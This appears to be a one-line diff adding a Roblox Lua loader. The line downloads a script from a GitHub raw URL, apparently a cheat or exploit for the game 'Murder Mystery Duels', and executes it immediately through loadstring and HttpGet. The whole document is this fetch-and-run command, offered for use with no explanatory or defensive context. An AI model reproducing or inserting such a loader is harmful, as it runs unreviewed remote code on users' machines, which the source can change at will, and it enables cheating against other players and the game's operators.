@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/murder-mystery-duels-spam7-6qud6ipbic1lza.lua"))()
